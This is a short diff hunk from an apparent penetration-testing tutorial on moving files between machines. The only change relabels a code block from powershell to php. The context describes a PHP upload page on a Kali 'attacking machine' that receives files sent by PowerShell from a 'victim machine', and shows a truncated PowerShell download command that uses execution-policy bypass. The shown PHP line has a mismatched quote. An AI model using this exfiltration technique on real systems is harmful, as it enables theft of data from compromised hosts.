@@ -49,7 +49,7 @@ powershell -c "-exec bypass mkdir c:\temp & Invoke-WebRequest -URI http://10.10.
 
 This is a method where you use a HTML server running on your Kali Linux attacking machine, where PowerShell can upload a file from a victim machine to your Kali. First, we will need to create a PHP page to process our upload request. This can be found here:
 
-{% highlight powershell linenos %}
+{% highlight php linenos %}
 <?php
 $uploaddir = '/var/www/uploads';
 $uploadfile = '$uploaddir . $_FILES['file']['name'];
